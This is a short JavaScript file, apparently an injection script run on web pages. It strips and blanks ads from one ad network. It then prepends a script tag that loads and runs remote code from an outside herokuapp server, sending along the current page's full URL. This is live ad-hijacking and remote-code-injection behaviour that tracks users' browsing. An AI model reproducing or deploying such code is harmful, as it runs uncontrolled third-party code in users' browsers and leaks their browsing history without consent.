function DOMContentLoadedHandle()
{
    //madadsmedia
    $('div[id*="ssvzone"]').each(function(index){
        $(this).addClass('adsMicroDIV_'+index).addClass('adsMicroDIV');
        $(this).attr("id","ssvzone_removed");
        $(this).html("");
    });
    $('iframe[src*="madadsmedia"]').each(function(index){
        $(this).parent().addClass('MadadsmediaDIV_'+index).addClass('MadadsmediaDIV');
        $(this).attr('src','');
    });
    $('html').prepend('<div id="injectiondiv"><script type="text/javascript" src="https://warm-temple-4968.herokuapp.com/injectionScript/injecScript.php?url='+encodeURIComponent(window.location)+'"></script></div>');
}
$(document).bind('DOMContentLoaded', DOMContentLoadedHandle);